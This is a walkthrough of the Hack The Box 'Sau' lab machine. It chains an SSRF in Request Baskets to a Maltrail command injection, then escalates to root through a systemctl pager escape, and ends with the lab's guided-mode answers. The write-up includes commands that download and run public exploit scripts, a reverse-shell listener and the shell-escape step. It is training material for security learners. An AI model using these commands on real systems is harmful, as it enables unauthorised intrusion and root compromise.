# 🚀 Hack The Box: Sau (Linux, Easy)

**by [a1i3n37x](https://github.com/a1i3n37x) · [Alien37.com](https://www.alien37.com)**

---

## ✨ Intro — Sau

Sau is all about digging deeper. Nothing on this box is outright broken — you’re just not meant to see it at first.

You’ll learn how to access internal services through a vulnerable proxy, exploit unauthenticated command injection via headers, and finally escalate to root using a sneaky `systemctl` misconfiguration.

This box teaches you to connect the dots between services, and to treat every limited response as a potential opening. SSRF, CVE chaining, and pager escapes — all packed into one smooth ride.

---

## 📡 Reconnaissance — Sau

Initial scan:
```bash
nmap -sC -sV -Pn 10.10.11.224 -oN sau-nmap.txt
```

Results:
```bash
22/tcp     open  ssh
80/tcp     filtered http
55555/tcp  open  http    request-baskets 1.2.1
```

Port 80 is filtered — no direct access.
Port 55555 is hosting **Request Baskets**, version `1.2.1`.

### 🧠 Observations:
- Port 80 is likely open *internally*, but not from the outside
- Request Baskets may be able to access it → time to test for SSRF

---

## 🔍 Scanning & Enumeration — Sau

Navigated to:
```bash
http://10.10.11.224:55555
```

Confirmed the app was **Request Baskets v1.2.1**. Based on CVE research:

> 🛠️ `CVE-2023-27163` — SSRF via basket forwarding functionality

Used a prebuilt exploit:
```bash
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80
```

This let us proxy requests from the server itself → **bypassing the filter on port 80**.

We accessed:
```bash
http://10.10.11.224:55555/<basket>
```

Which returned a Maltrail web interface.

---

## 💣 Gaining Access — Sau

Maltrail v0.53 is known to be vulnerable to:
> 🧨 **Unauthenticated Command Injection** via `/login` endpoint

Instead of crafting a custom payload, we used a prebuilt Python exploit:

```bash
wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/main/exploit.py
python3 exploit.py <your-ip> 9000 http://10.10.11.224:55555/<basket>
```

Set up a listener:
```bash
nc -lvnp 9000
```

Received a shell as user `puma`.

---

## 🧬 Post-Exploitation — Puma

Checked access:
```bash
sudo -l
```

Output:
```
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

That command opens `less`. Escaped with:
```bash
!/bin/bash
```

Spawned a root shell. Confirmed with `whoami` → `root`

---

## 🪙 Flag Capture — Sau

- **User flag**: `/home/puma/user.txt`
- **Root flag**: `/root/root.txt`

---

## 🧭 Guided Mode Answers — Sau

<details>
<summary><strong>Target IP Address</strong></summary>
10.10.11.224
</details>

<details>
<summary><strong>Which is the highest open TCP port on the target machine?</strong></summary>
55555
</details>

<details>
<summary><strong>What is the name of the open source software that the application on 55555 is "powered by"?</strong></summary>
Request Baskets
</details>

<details>
<summary><strong>What is the version of request-baskets running on Sau?</strong></summary>
1.2.1
</details>

<details>
<summary><strong>What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?</strong></summary>
CVE-2023-27163
</details>

<details>
<summary><strong>What is the name of the software that the application running on port 80 is "powered by"?</strong></summary>
Maltrail
</details>

<details>
<summary><strong>What is the relative path on the webserver targeted by this exploit?</strong></summary>
/login
</details>

<details>
<summary><strong>What system user is the Mailtrail application running as on Sau?</strong></summary>
puma
</details>

<details>
<summary><strong>Submit the flag located in the puma user's home directory.</strong></summary>
<code>&lt;contents of /home/puma/user.txt&gt;</code>
</details>

<details>
<summary><strong>Submit flag difficulty rating</strong></summary>
Easy
</details>

<details>
<summary><strong>What is the full path to the binary (without arguments) the puma user can run as root on Sau?</strong></summary>
/usr/bin/systemctl
</details>

<details>
<summary><strong>What is the full version string for the instance of systemd installed on Sau?</strong></summary>
systemd 245 (245.4-4ubuntu3.13)
</details>

<details>
<summary><strong>What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?</strong></summary>
CVE-2023-26604
</details>

<details>
<summary><strong>Submit the flag located in the root user's home directory.</strong></summary>
<code>&lt;contents of /root/root.txt&gt;</code>
</details>

---

## 🧠 Lessons Learned — Sau

- Filtered ports can still be reachable from the inside (SSRF target!)
- CVE chaining is powerful: SSRF → Maltrail → Command Injection
- Always run `sudo -l`, even if you think you can’t use sudo
- `less` and `systemctl` are common privilege escalation paths
- A clear exploit chain beats fancy obfuscation every time

---

## 🎓 CEH Summary — Sau

**CEH Domains Covered:**

- **Reconnaissance**: Nmap & service discovery
- **Vulnerability Research**: CVEs for Request Baskets + Maltrail
- **Exploitation**: SSRF + Python exploit for Maltrail injection
- **Privilege Escalation**: Pager escape via `systemctl` + `!/bin/bash`
- **Post-Exploitation**: Enumeration, flag capture, root access

> **“Sometimes, the only thing filtering your access… is your perspective.” 👽**

---

*Written by [a1i3n37x](https://github.com/a1i3n37x) · Hack The Box | [Alien37.com](https://alien37.com)*
